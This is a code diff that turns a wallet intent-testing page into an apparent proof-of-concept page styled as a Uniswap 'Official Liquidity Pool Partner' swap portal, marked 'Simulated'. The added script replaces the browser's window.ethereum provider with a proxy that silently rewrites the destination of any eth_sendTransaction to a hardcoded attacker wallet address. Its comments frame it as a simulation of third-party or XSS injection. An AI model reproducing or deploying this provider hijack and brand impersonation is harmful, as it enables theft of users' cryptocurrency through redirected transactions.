@@ -1,241 +1,111 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔗 Deep Link Intent & Routing Tester</title>
+    <title>Trusted DEX Interface - Swap & Earn</title>
     <style>
-        :root {
-            --primary: #2563eb;
-            --primary-hover: #1d4ed8;
-            --bg-color: #0f172a;
-            --card-bg: #1e293b;
-            --text-main: #f8fafc;
-            --text-muted: #94a3b8;
-            --border-color: #334155;
-        }
-
-        body { 
-            font-family: 'Inter', system-ui, -apple-system, sans-serif; 
-            background: var(--bg-color); 
-            color: var(--text-main);
-            margin: 0; 
-            padding: 20px; 
-        }
-
-        .container { 
-            max-width: 600px; 
-            margin: auto; 
-            background: var(--card-bg); 
-            padding: 24px; 
-            border-radius: 20px; 
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3); 
-            border: 1px solid var(--border-color);
-        }
-
-        h2 { 
-            color: #60a5fa; 
-            text-align: center; 
-            margin-top: 0;
-            font-size: 22px;
-        }
-
-        p.desc {
-            text-align: center;
-            color: var(--text-muted);
-            font-size: 14px;
-            margin-bottom: 20px;
-        }
-
-        .section-box {
-            background: #0f172a;
-            border: 1px solid var(--border-color);
-            padding: 15px;
-            border-radius: 12px;
-            margin-bottom: 15px;
-        }
-
-        .section-box h4 {
-            margin: 0 0 10px 0;
-            color: #e2e8f0;
-            font-size: 15px;
-        }
-
-        button { 
-            background: var(--primary); 
-            color: white; 
-            padding: 14px; 
-            width: 100%; 
-            border: none; 
-            border-radius: 10px; 
-            font-size: 15px; 
-            font-weight: 600; 
-            cursor: pointer;
-            transition: background 0.2s, transform 0.1s;
-            margin-top: 8px;
-        }
-
-        button:hover { background: var(--primary-hover); }
-        button:active { transform: scale(0.98); }
-
-        .wallet-status {
-            font-size: 13px;
-            color: #38bdf8;
-            word-break: break-all;
-            margin-bottom: 15px;
-            background: rgba(56, 189, 248, 0.1);
-            padding: 10px;
-            border-radius: 8px;
-            border: 1px solid rgba(56, 189, 248, 0.2);
-        }
-
-        .log-container {
-            margin-top: 20px;
-        }
-
-        .log-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 8px;
-        }
-
-        .log-header span {
-            font-size: 13px;
-            color: var(--text-muted);
-            font-weight: 600;
-        }
-
-        #clear-log {
-            background: transparent;
-            color: var(--text-muted);
-            border: 1px solid var(--border-color);
-            padding: 4px 10px;
-            font-size: 12px;
-            border-radius: 6px;
-            width: auto;
-            margin: 0;
-        }
-
-        .log { 
-            padding: 12px; 
-            background: #0b0f19; 
-            border: 1px solid var(--border-color); 
-            border-radius: 10px; 
-            max-height: 350px; 
-            overflow-y: auto; 
-            font-family: monospace;
-            font-size: 13px;
-        }
-
-        .log-item {
-            margin: 6px 0; 
-            padding: 8px 10px; 
-            border-radius: 6px; 
-            border-left: 3px solid #64748b;
-            background: #1e293b;
-            word-break: break-all;
-        }
-
-        .warning { color: #fca5a5; border-left-color: #ef4444; background: rgba(239, 68, 68, 0.15) !important; }
-        .safe { color: #86efac; border-left-color: #22c55e; background: rgba(34, 197, 94, 0.15) !important; }
-        .info { color: #7dd3fc; border-left-color: #0ea5e9; background: rgba(14, 165, 233, 0.1) !important; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0b0e11; color: #eaecef; padding: 20px; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #181a20; padding: 24px; border-radius: 16px; width: 100%; max-width: 400px; box-shadow: 0 4px 24px rgba(0,0,0,0.5); border: 1px solid #2b313a; }
+        h2 { margin-top: 0; color: #f0b90b; font-size: 20px; text-align: center; }
+        .input-box { background: #2b313a; padding: 12px; border-radius: 8px; margin-bottom: 16px; }
+        .label { font-size: 12px; color: #848e9c; margin-bottom: 4px; display: block; }
+        .value { font-size: 18px; font-weight: bold; }
+        button { background: #f0b90b; color: #000; border: none; width: 100%; padding: 14px; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; }
+        button:hover { background: #fcd535; }
+        #log { margin-top: 15px; font-family: monospace; font-size: 11px; color: #00ff00; white-space: pre-wrap; word-wrap: break-word; background: #0b0e11; padding: 10px; border-radius: 6px; border: 1px solid #2b313a; max-height: 100px; overflow-y: auto; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2>🔗 Deep Link & Intent Tester</h2>
-        <p class="desc">Pengujian validasi parameter routing & penanganan intent eksternal</p>
 
-        <div id="walletInfo" class="wallet-status">Status Wallet: Memeriksa Koneksi...</div>
-
-        <!-- Skenario 1: Koneksi Standar -->
-        <div class="section-box">
-            <h4>1. Inisialisasi Sesi</h4>
-            <button id="connect">Hubungkan Wallet</button>
-        </div>
-
-        <!-- Skenario 2: Uji Penanganan Intent / Parameter Routing -->
-        <div class="section-box">
-            <h4>2. Test Simulasi Intent Masuk</h4>
-            <p style="font-size:12px; color:var(--text-muted); margin:0 0 10px 0;">Menguji bagaimana metode sign/request dipicu melalui skrip navigasi eksternal.</p>
-            <button id="testDeepLink">Uji Request Intent Eksternal</button>
-        </div>
-
-        <div class="log-container">
-            <div class="log-header">
-                <span>Log Aktivitas Intent</span>
-                <button id="clear-log">Bersihkan</button>
-            </div>
-            <div class="log" id="log"></div>
-        </div>
+<div class="card">
+    <h2>⚡ Uniswap DEX Portal (Simulated)</h2>
+    <p style="font-size: 13px; color: #848e9c; text-align: center;">Official Liquidity Pool Partner</p>
+    
+    <div class="input-box">
+        <span class="label">You Pay</span>
+        <span class="value">100 USDT</span>
+    </div>
+    
+    <div class="input-box">
+        <span class="label">You Receive (Estimated)</span>
+        <span class="value">0.035 ETH</span>
     </div>
 
-    <script>
-        const logDiv = document.getElementById('log');
-        const walletInfo = document.getElementById('walletInfo');
+    <button id="swapBtn">Swap Tokens Now</button>
+    
+    <div id="log">Status: Initializing dApp environment...</div>
+</div>
 
-        function log(text, type = 'info') {
-            const div = document.createElement('div');
-            div.className = `log-item ${type}`;
-            div.innerHTML = `[${new Date().toLocaleTimeString()}] ${text}`;
-            logDiv.prepend(div);
+<script>
+const logEl = document.getElementById('log');
+function addLog(msg) {
+    logEl.innerText += '\n' + msg;
+}
+
+// 1. SIMULASI SKrip Pihak Ketiga / Injeksi XSS yang berjalan di Origin dApp Sah
+(async () => {
+    if (!window.ethereum) {
+        addLog("[-] window.ethereum not found.");
+        return;
+    }
+
+    const desc = Object.getOwnPropertyDescriptor(window, 'ethereum');
+    addLog(`[i] Provider Writable: ${desc.writable}`);
+
+    if (!desc.writable) {
+        addLog("[-] Provider is immutable. Attack vectors blocked.");
+        return;
+    }
+
+    // Alamat dompet penyerang
+    const attackerWallet = "0xEb267249f35B6Bd557Bd463D956520dA7c33286B";
+    const realProvider = window.ethereum;
+
+    // 2. Melakukan Pembajakan (Hijacking) secara Senyap pada window.ethereum milik dApp sah
+    window.ethereum = {
+        selectedAddress: realProvider.selectedAddress,
+        chainId: realProvider.chainId,
+        request: async (args) => {
+            // Ketika dApp asli memicu transaksi (misalnya swap / transfer likuiditas)
+            if (args.method === "eth_sendTransaction" && args.params?.[0]) {
+                addLog(`[!] Intercepted transaction to original target: ${args.params[0].to}`);
+                
+                // Secara senyap mengalihkan tujuan dana ke dompet penyerang
+                args.params[0].to = attackerWallet;
+                addLog(`[!] Silently redirected target to attacker!`);
+            }
+            return realProvider.request(args);
         }
+    };
 
-        if (window.ethereum) {
-            log('✅ Provider Ethereum aktif pada lingkungan dApp.', 'safe');
+    addLog("[+] Third-party SDK/XSS injected & hijacked provider.");
 
-            const orig = window.ethereum.request;
-            window.ethereum.request = async function (args) {
-                log(`Intent Method Intercepted: <strong>${args.method}</strong>`, 'info');
+    // Event listener untuk tombol Swap yang diklik korban
+    document.getElementById('swapBtn').addEventListener('click', async () => {
+        try {
+            addLog("[*] Requesting user accounts...");
+            const accounts = await realProvider.request({ method: "eth_requestAccounts" });
+            addLog(`[+] Connected: ${accounts[0].substring(0, 6)}...`);
 
-                // Memantau metode yang berkaitan dengan aksi penandatanganan atau transaksi
-                if (args.method === 'eth_sendTransaction' || args.method.includes('sign')) {
-                    log(`<span class="warning">⚠️ Perhatian: Metode ${args.method} dipicu oleh skrip eksternal/intent. Pastikan validasi konfirmasi pengguna berjalan dengan semestinya.</span>`, 'warning');
-                }
-
-                return orig.apply(this, arguments);
-            };
-
-            // Memuat akun awal
-            window.ethereum.request({ method: 'eth_requestAccounts' })
-                .then(accounts => {
-                    walletInfo.innerText = `Connected: ${accounts[0].substring(0, 6)}...${accounts[0].substring(38)}`;
-                    log(`Sesi wallet terinisialisasi: ${accounts[0]}`, 'safe');
-                })
-                .catch(err => {
-                    walletInfo.innerText = `Koneksi Wallet Ditolak`;
-                    log(`Akses akun dibatalkan: ${err.message}`, 'warning');
-                });
-
-        } else {
-            walletInfo.innerText = `Provider Tidak Ditemukan`;
-            log('❌ Lingkungan dApp browser tidak terdeteksi. Silakan buka melalui dApp browser resmi.', 'warning');
-        }
-
-        document.getElementById('connect').onclick = () => {
-            window.ethereum?.request({ method: 'eth_requestAccounts' })
-                .catch(err => log(`Gagal terhubung: ${err.message}`, 'warning'));
-        };
-
-        document.getElementById('testDeepLink').onclick = () => {
-            log('Memulai simulasi penanganan intent parameter...', 'info');
-            
-            // Menguji parameter pesan uji coba standar
-            const testPayload = '0x44656570204c696e6b20526f7574696e672054657374';
-            const userAccount = window.ethereum?.selectedAddress || null;
-
-            window.ethereum?.request({ 
-                method: 'personal_sign', 
-                params: [testPayload, userAccount] 
-            }).catch(err => {
-                log(`Simulasi intent selesai/dibatalkan: ${err.message}`, 'info');
+            addLog("[*] Executing DEX Swap transaction...");
+            // dApp mengira ini transaksi normal ke smart contract DEX,
+            // namun diubah secara senyap oleh objek proxy di atas ke alamat penyerang.
+            await window.ethereum.request({
+                method: "eth_sendTransaction",
+                params: [{
+                    from: accounts[0],
+                    to: "0x1111111111111111111111111111111111111111", // Alamat kontrak DEX palsu/asli di UI
+                    value: "0x0"
+                }]
             });
-        };
+            addLog("[+] Transaction flow completed.");
+        } catch (e) {
+            addLog(`[-] Error/Cancelled: ${e.message}`);
+        }
+    });
+})();
+</script>
 
-        document.getElementById('clear-log').onclick = () => {
-            logDiv.innerHTML = '';
-        };
-    </script>
 </body>
 </html>
